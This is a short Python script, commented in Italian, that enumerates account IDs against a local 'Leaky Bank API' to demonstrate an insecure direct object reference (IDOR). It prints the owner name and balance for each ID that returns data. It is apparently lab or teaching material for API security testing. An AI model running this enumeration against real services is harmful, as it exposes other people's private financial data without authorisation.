import requests
import time

# Target URL
BASE_URL = "http://127.0.0.1:5000/api/balance/"

def run_postman_simulation():
    print("--- Avvio simulazione Postman Collection Runner ---")
    print("[*] Target: Leaky Bank API")
    print("[*] Obiettivo: Trovare account nascosti (IDOR Hunting)\n")

    # Simuliamo il range di ID che vogliamo testare (es. da 998 a 1005)
    # Nella realtà proveresti migliaia di ID.
    test_ids = range(998, 1005)

    for acc_id in test_ids:
        url = f"{BASE_URL}{acc_id}"
        
        try:
            # Effettua la richiesta GET
            response = requests.get(url)
            
            # Analisi della risposta (Status Code)
            if response.status_code == 200:
                data = response.json()
                owner = data['data']['owner']
                balance = data['data']['balance']
                
                print(f"[+] 200 OK - TROVATO! ID: {acc_id}")
                print(f"    -> Proprietario: {owner}")
                print(f"    -> Saldo: € {balance}")
                print("-" * 30)
            else:
                print(f"[-] 404 Not Found - ID: {acc_id} non esiste.")
                
        except Exception as e:
            print(f"[!] Errore di connessione: {e}")

if __name__ == "__main__":
    run_postman_simulation()